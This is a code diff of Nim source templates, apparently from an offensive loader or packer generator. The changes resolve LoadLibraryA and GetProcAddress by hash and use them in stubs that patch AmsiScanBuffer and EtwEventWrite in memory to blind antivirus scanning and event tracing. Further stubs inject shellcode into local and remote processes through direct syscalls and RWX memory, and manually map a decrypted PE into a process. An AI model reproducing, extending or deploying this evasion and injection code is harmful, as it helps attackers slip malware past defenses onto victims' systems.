@@ -36,6 +36,27 @@ MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get
 
 """
 
+let DInvokeLoadLibraryAGetProcAddress * = """
+
+type
+  LoadLibraryA_t* = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
+  GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
+  
+const
+  LoadLibraryA_HASH * = 1348397733
+  GetProcAddress_HASH * = 522356738
+  
+var MyLoadLibraryA*: LoadLibraryA_t
+var MyGetProcAddress*: GetProcAddress_t
+
+MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))
+
+MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
+
+
+
+"""
+
 let GetSyscallStub * = """
 type
   PS_ATTR_UNION* {.pure, union.} = object
@@ -188,13 +209,7 @@ var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 var syscallStub_NtProtect: LPVOID
 
 MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-syscallStub_NtProtect = MyVirtualAllocEx(
-    pHandle2,
-    NULL,
-    cast[SIZE_T](SYSCALL_STUB_SIZE),
-    MEM_COMMIT,
-    PAGE_EXECUTE_READ_WRITE
-)
+syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
 
 """
 
@@ -341,7 +356,7 @@ when isMainModule:
 let AMSIStub * = """
 proc PatchAmsi(): bool =
     var
-        amsi: LibHandle
+        amsi: HMODULE
         cs: pointer
         op: ULONG
         t: ULONG
@@ -351,14 +366,13 @@ proc PatchAmsi(): bool =
         let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
         let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    amsi = loadLib(obf("amsi"))
-    if isNil(amsi):
+    
+    amsi = MyLoadLibraryA(obf("amsi.dll"))
+    if (amsi == 0):
         echo obf("[X] Failed to load amsi.dll")
         return disabled
 
-    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
+    cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
     if isNil(cs):
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
@@ -393,8 +407,6 @@ proc PatchAmsi(): bool =
     if (success != 0):
         echo obf("NtWriteVirtualMemory failed")
         return disabled
-        # fails for some reason
-        #copyMem(addr cs, unsafeAddr patch, patch.len)
     success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
     if (success != 0):
         echo obf("NtProtectVirtualMemory failed")
@@ -420,7 +432,7 @@ let ETWPatchStub * = """
 
 proc Patchntdll(): bool =
     var
-        ntdll: LibHandle
+        ntdll: HMODULE
         cs: pointer
         op: ULONG
         t: ULONG
@@ -430,14 +442,12 @@ proc Patchntdll(): bool =
         let patch: array[1, byte] = [byte 0xc3]
     elif defined i386:
         let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    ntdll = loadLib(obf("ntdll"))
-    if isNil(ntdll):
+    ntdll = MyLoadLibraryA(obf("ntdll"))
+    if (ntdll == 0):
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
 
-    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
+    cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
     if isNil(cs):
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
@@ -472,8 +482,6 @@ proc Patchntdll(): bool =
     if (success != 0):
         echo obf("NtWriteVirtualMemory failed")
         return disabled
-        # fails for some reason
-        #copyMem(addr cs, unsafeAddr patch, patch.len)
     success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
     if (success != 0):
         echo obf("NtWriteVirtualMemory failed")
@@ -654,7 +662,7 @@ let ShellcoderemoteinjectStub * = """
     cast[SIZE_T](SYSCALL_STUB_SIZE),
     MEM_COMMIT,
     PAGE_EXECUTE_READ_WRITE
-)
+    )
 
     
     var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
@@ -726,8 +734,9 @@ let ShellcoderemoteinjectStub * = """
     status = NtClose(pHandle)
 
     # This doesn't work so far for some reason
-    #success = VirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
-    #echo obf("set back old protect")
+    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+    if (success):
+      echo obf("set back old protect")
     echo success
    
 
@@ -759,14 +768,13 @@ var
 """
 
 let ShellcodelocalStub * = """
-from winlean import getCurrentProcess
 
 proc pwndem[byte](friendlycode: openarray[byte]): void =
 
     let tProcess = MyGetCurrentProcessId()
     var pHandle: HANDLE = MyGetCurrentProcess()
 
-    let syscallStub_NtAlloc = VirtualAllocEx(
+    let syscallStub_NtAlloc = MyVirtualAllocEx(
         pHandle,
         NULL,
         cast[SIZE_T](SYSCALL_STUB_SIZE),
@@ -941,7 +949,7 @@ proc fixIAT*(modulePtr: PVOID): bool =
         elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
           boolvar = true
         if (boolvar):
-          var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+          var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
           fieldThunk.u1.Function = ULONGLONG(libaddr)
         if fieldThunk.u1.Function == 0:
           break
@@ -953,8 +961,8 @@ proc fixIAT*(modulePtr: PVOID): bool =
           var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
           
           let asd = byname.Name
-          var hmodule: HMODULE = LoadLibraryA(libname)
-          var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
+          var hmodule: HMODULE = MyLoadLibraryA(libname)
+          var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
           
     
           fieldThunk.u1.Function = ULONGLONG(libaddr)
@@ -966,16 +974,16 @@ proc fixIAT*(modulePtr: PVOID): bool =
 
 proc pwndem(): void =
 
-    var shellcodePtr: ptr = dectext[0].addr
+    var peToLoadPtr: ptr = dectext[0].addr
 
     var pImageBase: ptr BYTE = nil
     var preferAddr: LPVOID = nil
-    var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
+    var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(peToLoadPtr))
     if (ntHeader == nil):
       echo obf("[+] File isn't a PE file.")
       quit()
 
-    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(shellcodePtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
+    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(peToLoadPtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
     preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
     
     echo $ntHeader.OptionalHeader.SizeOfImage
@@ -995,7 +1003,7 @@ proc pwndem(): void =
     ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
     
     var bytesWritten: SIZE_T
-    status = NtWriteVirtualMemory(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
+    status = NtWriteVirtualMemory(pHandle2,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
     
     echo obf("NtWriteVirtualMemory:")
     echo status
@@ -1005,7 +1013,7 @@ proc pwndem(): void =
     var i: int = 0
     while i < cast[int](ntHeader.FileHeader.NumberOfSections):
       var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
-      var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
+      var source: LPVOID = (peToLoadPtr + SectionHeaderArr[i].PointerToRawData)
       status = NtWriteVirtualMemory(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
       echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
       echo status
